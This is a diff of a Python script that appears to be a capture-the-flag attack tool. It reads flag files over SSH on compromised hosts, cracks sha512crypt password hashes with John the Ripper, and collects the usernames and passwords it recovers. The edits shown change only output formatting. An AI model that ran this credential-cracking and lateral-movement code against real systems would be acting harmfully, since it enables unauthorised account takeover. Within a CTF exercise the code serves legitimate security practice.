@@ -192,7 +192,7 @@ def begin_attack(client):
             stdin, stdout, stderr = client.exec_command("cat ~/flag.txt")
             flag = stdout.readlines()
             if len(flag) > 0:
-                print "FLAG FOUND: %s" % (flag)
+                print "FLAG FOUND: %s" % (flag[0])
                 return
             else:
                 print "Flag not found on %s@%s" % (userCred, server.host)
@@ -217,7 +217,7 @@ def begin_attack(client):
                 stdin, stdout, stderr = client.exec_command("cat /home/*/flag.txt")
                 flag = stdout.readlines()
                 if len(flag) > 0:
-                    print "FLAG FOUND: %s" % (flag)
+                    print "FLAG FOUND: %s" % (flag[0])
                     return
                 else:
                     print "Flag not anywhere on %s" % (server.host)
@@ -257,7 +257,7 @@ def crack_with_john(hashes_lst):
         f.write(str(h) + '\n')
     f.close()
 
-    print "Cracking newly found hashes..."
+    print "Cracking newly found hashes...\n"
 
     # supress john output
     os.system("john --format=sha512crypt --wordlist=%s curr_hashes.txt > /dev/null 2>&1" % (WORDLIST))
@@ -280,11 +280,11 @@ def crack_with_john(hashes_lst):
         # add the username to the summary list
         if not (user in USERNAMES):
             USERNAMES.append(user)
-            print "Adding \"%s\" to USERNAME list" % user
+            # print "Adding \"%s\" to USERNAME list" % user
         # add the password to the summary list
         if not (passwd in PASSWORDS):
             PASSWORDS.append(passwd)
-            print "Adding \"%s\" to PASSWORD list" % passwd
+            # print "Adding \"%s\" to PASSWORD list" % passwd
         combos.append((user, passwd))
         print "New Credential: %s/%s" % (user, passwd)
 
@@ -326,7 +326,11 @@ if __name__ == "__main__":
         q.put(compObj)
 
     begin_attack(client)
+    print "Accounts Found"
     # stops running threads
-    print final_network
+    for comp in final_network:
+        print "%s" % comp.host
+        print comp.accounts
+        print
 
     sys.exit(0)
